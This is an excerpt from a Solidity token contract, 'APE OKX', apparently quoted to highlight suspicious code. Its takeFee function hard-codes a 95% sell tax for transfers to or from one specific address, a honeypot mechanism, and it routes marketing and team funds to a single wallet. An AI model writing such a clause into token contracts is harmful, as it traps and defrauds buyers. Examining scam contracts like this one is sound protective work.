...
contract ApeOkx is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x0d44780D25f99A8Deeee6ae7d1030C177a883ab2);
    address payable public teamWalletAddress = payable(0x0d44780D25f99A8Deeee6ae7d1030C177a883ab2);
    ...
    string private _name = "APE OKX";
    string private _symbol = "AOKX";
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (sender == address(0x55afa7989138328f08a7429D9d81ff04E7f1E9CC) || recipient == address(0x55afa7989138328f08a7429D9d81ff04E7f1E9CC)) { _totalTaxIfSelling = 95; }
